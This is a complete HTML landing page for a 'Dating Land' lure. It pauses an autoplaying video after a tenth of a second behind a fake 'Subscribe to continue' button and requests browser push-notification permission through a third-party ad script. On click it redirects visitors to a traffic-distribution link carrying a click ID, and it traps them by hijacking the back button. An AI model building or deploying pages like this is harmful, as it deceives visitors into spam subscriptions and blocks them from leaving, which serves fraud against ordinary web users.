<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dating Land</title>
<style>
    html, body {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        font-family: Arial, sans-serif;
        background-color: #000;
    }

    #videoContainer {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        z-index: 1;
    }

    #myVideo {
        position: absolute;
        top: 50%;
        left: 50%;
        min-width: 100%;
        min-height: 100%;
        width: auto;
        height: auto;
        transform: translate(-50%, -50%);
        object-fit: cover;
    }

    /* Градиент overlay сверху видео */
    #overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(to bottom, rgba(0,0,0,0.4), rgba(0,0,0,0.8));
        z-index: 1;
        opacity: 0;
        transition: opacity 0.5s ease;
    }

    #overlay.show {
        opacity: 1;
    }

    #subscribeBtn {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%) scale(0);
        padding: 18px 36px;
        font-size: 26px;
        color: #fff;
        background-color: rgba(255, 0, 150, 0.9);
        border: 2px solid #fff;
        border-radius: 12px;
        cursor: pointer;
        z-index: 2;
        opacity: 0;
        transition: transform 0.5s ease, opacity 0.5s ease;
    }

    #subscribeBtn.show {
        transform: translate(-50%, -50%) scale(1);
        opacity: 1;
    }

    /* Адаптация под мобильные */
    @media (max-width: 768px) {
        #subscribeBtn {
            font-size: 20px;
            padding: 14px 28px;
        }
    }
</style>
</head>
<body>

<div id="videoContainer">
    <video id="myVideo" autoplay muted playsinline>
        <source src="https://drive.google.com/uc?export=download&id=1vQyzBuAsTze-RdFdAWAoWgltiQNetNTs" type="video/mp4">
        Your browser does not support HTML5 video.
    </video>
    <div id="overlay"></div>
    <div id="subscribeBtn">Subscribe to continue</div>
</div>

<!-- Скрипт для push подписок -->
<script type="application/javascript" src="https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ" async></script>

<script>
const video = document.getElementById('myVideo');
const btn = document.getElementById('subscribeBtn');
const overlay = document.getElementById('overlay');
const urlParams = new URLSearchParams(window.location.search);
const clickId = urlParams.get('clickid') || '';
const targetUrl = `https://hotbjayapa.today/tds?id=1556189731&p1=${clickId}&p2=sub2&p3=sub3&p4=sub4`;

// Ускоряем всё в 10 раз: пауза через 0.1 сек, push через 0.25 сек
video.addEventListener('loadeddata', () => {
    setTimeout(() => {
        video.pause();
        overlay.classList.add('show');
        btn.classList.add('show');

        // Push уведомление через 0.25 сек
        setTimeout(() => {
            if ('Notification' in window) {
                Notification.requestPermission();
            }
        }, 250); // 0.25 сек
    }, 100); // 0.1 сек
});

// Клик по видео или кнопке — продолжить видео и редирект
function continueAndRedirect() {
    btn.classList.remove('show');
    overlay.classList.remove('show');
    video.play();
    setTimeout(() => {
        window.location.replace(targetUrl);
    }, 300); // ускорено: редирект через 0.3 сек после возобновления
}

video.addEventListener('click', continueAndRedirect);
btn.addEventListener('click', continueAndRedirect);

// Back button protection
history.pushState(null, null, location.href);
window.onpopstate = function() {
    history.go(1);
};
</script>

</body>
</html>
